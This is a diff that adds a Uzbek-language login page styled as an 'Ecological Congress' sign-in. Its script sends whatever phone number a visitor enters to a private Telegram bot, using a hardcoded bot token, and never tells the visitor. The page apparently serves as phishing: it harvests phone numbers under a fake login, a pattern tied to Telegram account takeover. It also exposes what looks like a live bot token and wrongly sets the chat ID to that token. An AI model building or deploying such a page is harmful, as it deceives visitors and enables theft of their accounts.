@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="uz">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tizimga kirish | Ekologik Qurultoy</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #075b3f, #087b70, #075b88);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: rgba(255, 255, 255, 0.1);
+            -webkit-backdrop-filter: blur(16px);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            border-top: 1px solid rgba(255, 255, 255, 0.4);
+            border-radius: 24px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            width: 400px;
+            max-width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+            color: #ffffff;
+        }
+
+        .login-card h1 {
+            font-size: 26px;
+            margin-bottom: 12px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .login-card p {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .input-group input {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 12px;
+            padding: 14px 16px;
+            outline: none;
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #20a0e1;
+            color: #fff;
+            font-size: 14px;
+            padding: 13px;
+            border: none;
+            border-radius: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .submit-btn:hover {
+            background-color: #1a87be;
+        }
+
+        .status-msg {
+            margin-top: 15px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-card">
+        <h1>Tizimga Kirish</h1>
+        <p>Davom etish uchun telefon raqamingizni kiriting</p>
+
+        <form id="telegramForm">
+            <div class="input-group">
+                <input type="tel" id="phoneInput" placeholder="+998 (__) ___-__-__" required>
+            </div>
+
+            <button type="submit" id="submitBtn" class="submit-btn">Kirish</button>
+        </form>
+
+        <div id="status" class="status-msg"></div>
+    </div>
+
+    <script>
+        // 1. Telegram Bot sozlamalari:
+        const BOT_TOKEN = '8479516154:AAHb0VjMu6ST0pf3fJPebgHybPUZ7_p2zAk'; // Masalan: '123456789:ABCdefGhIJKlmNoPQRstuVWXyz'
+        const CHAT_ID = '8479516154:AAHb0VjMu6ST0pf3fJPebgHybPUZ7_p2zAk';     // Masalan: '987654321'
+
+        const form = document.getElementById('telegramForm');
+        const phoneInput = document.getElementById('phoneInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const status = document.getElementById('status');
+
+        form.addEventListener('submit', function (event) {
+            event.preventDefault(); // Sahifa qayta yuklanishini to'xtatadi
+
+            const phone = phoneInput.value.trim();
+
+            // Tugmani vaqtincha bloklash va yuklanish matnini ko'rsatish
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Yuborilmoqda...";
+            status.style.color = "#ffffff";
+            status.innerText = "";
+
+            // Botga yuboriladigan xabar matni
+            const textMessage = `📱 *Yangi kirish usanti:*\n\n📞 Telefon: \`${phone}\``;
+
+            // Telegram API URL manzili
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Telegram API ga so'rov yuborish (Fetch)
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: textMessage,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    status.style.color = "#8effa8";
+                    status.innerText = "Muvaffaqiyatli yuborildi!";
+                    phoneInput.value = ""; // Inputni tozalash
+                } else {
+                    status.style.color = "#ff8e8e";
+                    status.innerText = "Xatolik yuz berdi. Bot Token yoki Chat ID ni tekshiring.";
+                }
+            })
+            .catch(error => {
+                status.style.color = "#ff8e8e";
+                status.innerText = "Tarmoq xatoligi yuz berdi.";
+                console.error("Error:", error);
+            })
+            .finally(() => {
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Kirish";
+            });
+        });
+    </script>
+
+</body>
+
+</html>
